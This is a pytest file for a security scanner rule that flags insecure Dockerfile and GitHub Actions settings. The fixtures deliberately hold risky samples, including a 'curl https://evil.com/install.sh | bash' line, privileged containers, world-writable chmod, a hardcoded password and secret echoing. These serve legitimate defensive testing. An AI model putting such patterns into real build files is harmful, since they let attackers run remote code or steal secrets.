"""Tests for Docker/CI rule."""

from __future__ import annotations

from pathlib import Path

from vibeguard.config import VibeGuardConfig
from vibeguard.models import ScanContext, Severity
from vibeguard.rules.ci_docker import CiDockerRule


def _ctx(tmp_path: Path, files: dict[str, str]) -> ScanContext:
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    all_files = [tmp_path / n for n in files]
    return ScanContext(
        root=tmp_path,
        config=VibeGuardConfig(),
        files=all_files,
    )


class TestCiDockerRule:
    rule = CiDockerRule()

    # Dockerfile checks
    def test_privileged_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "RUN docker run --privileged myimage"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-PRIVILEGED" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_latest_tag_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "FROM python:latest\nRUN pip install app"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-LATEST-TAG" for f in findings)

    def test_curl_bash_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "RUN curl https://evil.com/install.sh | bash"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-CURL-BASH" for f in findings)

    def test_broad_chmod_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "RUN chmod 777 /app"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-BROAD-CHMOD" for f in findings)

    def test_secret_env_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "ENV PASSWORD=mysecret123"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-SECRET-ENV" for f in findings)

    def test_add_url_detected(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "ADD https://example.com/file.tar.gz /tmp/"})
        findings = self.rule.scan(ctx)
        assert any(f.id == "DOCKER-ADD-URL" for f in findings)

    # GitHub Actions checks
    def test_pull_request_target_detected(self, tmp_path: Path):
        ctx = _ctx(
            tmp_path,
            {".github/workflows/ci.yml": "on:\n  pull_request_target:\n    types: [opened]"},
        )
        findings = self.rule.scan(ctx)
        assert any(f.id == "GHA-PULL-REQUEST-TARGET" for f in findings)

    def test_broad_permissions_detected(self, tmp_path: Path):
        ctx = _ctx(
            tmp_path,
            {".github/workflows/ci.yml": "permissions: write-all\njobs:\n  build:"},
        )
        findings = self.rule.scan(ctx)
        assert any(f.id == "GHA-BROAD-PERMISSIONS" for f in findings)

    def test_secret_echo_detected(self, tmp_path: Path):
        ctx = _ctx(
            tmp_path,
            {".github/workflows/ci.yml": "run: echo ${{ secrets.MY_TOKEN }}"},
        )
        findings = self.rule.scan(ctx)
        assert any(f.id == "GHA-SECRET-ECHO" for f in findings)

    def test_unversioned_action_detected(self, tmp_path: Path):
        ctx = _ctx(
            tmp_path,
            {".github/workflows/ci.yml": "    - uses: actions/checkout\n"},
        )
        findings = self.rule.scan(ctx)
        assert any(f.id == "GHA-UNVERSIONED-ACTION" for f in findings)

    # Negative tests
    def test_non_dockerfile_not_checked(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"main.py": "RUN docker run --privileged myimage"})
        findings = self.rule.scan(ctx)
        assert len(findings) == 0

    def test_non_workflow_yml_not_checked(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"config.yml": "permissions: write-all"})
        findings = self.rule.scan(ctx)
        assert len(findings) == 0

    def test_safe_dockerfile(self, tmp_path: Path):
        ctx = _ctx(tmp_path, {"Dockerfile": "FROM python:3.12-slim\nRUN pip install app"})
        findings = self.rule.scan(ctx)
        assert len(findings) == 0
